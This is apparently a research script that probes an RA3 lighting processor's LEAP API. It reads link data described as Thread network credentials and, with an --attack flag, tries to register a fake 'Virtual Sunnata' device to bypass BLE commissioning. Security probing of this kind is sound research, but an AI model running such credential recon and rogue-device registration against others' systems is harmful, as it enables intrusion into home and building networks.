#!/usr/bin/env bun

/**
 * LEAP Commissioning Attack Test
 *
 * Tests whether we can register a virtual device with the RA3 processor
 * via LEAP API, bypassing BLE commissioning entirely.
 *
 * Attack vectors tested:
 *   1. Read CCX link properties (get Thread network credentials)
 *   2. Read existing devices/links to understand structure
 *   3. Try AddressDevice with a fake serial
 *   4. Try BeginTransferSession to trigger config push
 *
 * Usage:
 *   bun run tools/leap-attack-test.ts               # Read-only recon
 *   bun run tools/leap-attack-test.ts --attack       # Actually try AddressDevice
 */

import { LeapConnection } from "./leap-client";

const args = process.argv.slice(2);
const host = args.find((a) => !a.startsWith("--")) ?? "10.0.0.1";
const doAttack = args.includes("--attack");

async function main() {
  const conn = new LeapConnection({ host, certName: "ra3" });
  await conn.connect();
  console.log(`Connected to LEAP at ${host}`);

  // ═══════════════════════════════════════════════════════════════
  // 1. Read CCX link properties (Thread credentials)
  // ═══════════════════════════════════════════════════════════════
  console.log("\n=== CCX Link Properties ===");
  try {
    const link234 = await conn.read("/link/234");
    console.log(JSON.stringify(link234, null, 2));
  } catch (e) {
    console.log(`Failed: ${(e as Error).message}`);
  }

  // ═══════════════════════════════════════════════════════════════
  // 2. Read all link nodes (devices paired to CCX)
  // ═══════════════════════════════════════════════════════════════
  console.log("\n=== CCX Link Nodes ===");
  try {
    const nodes = await conn.read("/link/234/associatedlinknode");
    const body = (nodes as any)?.Body;
    if (body?.LinkNodes) {
      for (const node of body.LinkNodes) {
        console.log(
          `  ${node.href}: SN=${node.SerialNumber ?? "?"}, Type=${node.DeviceType ?? "?"}`
        );
      }
    } else {
      console.log(JSON.stringify(nodes, null, 2));
    }
  } catch (e) {
    console.log(`Failed: ${(e as Error).message}`);
  }

  // ═══════════════════════════════════════════════════════════════
  // 3. Read expanded link nodes (includes firmware, addressing state)
  // ═══════════════════════════════════════════════════════════════
  console.log("\n=== CCX Expanded Link Nodes (first 3) ===");
  try {
    const expanded = await conn.read("/link/234/associatedlinknode/expanded");
    const body = (expanded as any)?.Body;
    if (body?.LinkNodes) {
      for (const node of body.LinkNodes.slice(0, 3)) {
        console.log(JSON.stringify(node, null, 2));
      }
      console.log(`  ... ${body.LinkNodes.length} total link nodes`);
    } else {
      console.log(JSON.stringify(expanded, null, 2).slice(0, 2000));
    }
  } catch (e) {
    console.log(`Failed: ${(e as Error).message}`);
  }

  // ═══════════════════════════════════════════════════════════════
  // 4. Read server status
  // ═══════════════════════════════════════════════════════════════
  console.log("\n=== Server Status ===");
  try {
    const server = await conn.read("/server/1/status/ping");
    console.log(JSON.stringify(server, null, 2));
  } catch (e) {
    console.log(`Failed: ${(e as Error).message}`);
  }

  // ═══════════════════════════════════════════════════════════════
  // 5. Check for remote addressing sessions
  // ═══════════════════════════════════════════════════════════════
  console.log("\n=== Remote Addressing Sessions ===");
  for (const path of [
    "/remoteaddressingsession",
    "/service/1",
    "/service",
  ]) {
    try {
      const result = await conn.read(path);
      console.log(`${path}: ${JSON.stringify(result, null, 2).slice(0, 500)}`);
    } catch (e) {
      console.log(`${path}: ${(e as Error).message}`);
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // 6. Read project/system info
  // ═══════════════════════════════════════════════════════════════
  console.log("\n=== System Info ===");
  try {
    const system = await conn.read("/system/1");
    console.log(JSON.stringify(system, null, 2).slice(0, 1000));
  } catch (e) {
    console.log(`Failed: ${(e as Error).message}`);
  }

  // ═══════════════════════════════════════════════════════════════
  // ATTACK: Try to register a virtual device
  // ═══════════════════════════════════════════════════════════════
  if (doAttack) {
    console.log("\n=== ATTACK: AddressDevice ===");

    // Try CreateRequest to address a device
    // Based on the app's AddressDeviceCommand:
    //   createAndExecuteAddressDeviceRequestForHref:serialNumber:ipAddress:deviceClass:clientTag:andFormat:
    const fakeSerial = "04316549";  // Made up
    const fakeIp = "fd0d:02ef:a82c:0:0:ff:fe00:5000";  // Made up Thread IPv6

    console.log(`Attempting to address device: SN=${fakeSerial}, IP=${fakeIp}`);

    // Try various LEAP command formats based on what we saw in the app
    const attempts = [
      {
        name: "CreateRequest device with serial",
        url: "/device",
        body: {
          Device: {
            SerialNumber: parseInt(fakeSerial),
            AssociatedArea: { href: "/area/1" },
            Name: "Virtual Sunnata",
          },
        },
      },
      {
        name: "CreateRequest on link for addressing",
        url: "/link/234/associatedlinknode",
        body: {
          LinkNode: {
            SerialNumber: parseInt(fakeSerial),
          },
        },
      },
    ];

    for (const attempt of attempts) {
      console.log(`\n  Trying: ${attempt.name}`);
      console.log(`  URL: ${attempt.url}`);
      console.log(`  Body: ${JSON.stringify(attempt.body)}`);
      try {
        const result = await conn.create(attempt.url, attempt.body);
        console.log(`  RESULT: ${JSON.stringify(result, null, 2)}`);
      } catch (e) {
        console.log(`  FAILED: ${(e as Error).message}`);
      }
    }
  } else {
    console.log("\n(Run with --attack to try AddressDevice. Read-only mode.)");
  }

  conn.close();
}

main().catch((err) => {
  console.error(`Error: ${(err as Error).message}`);
  process.exit(1);
});
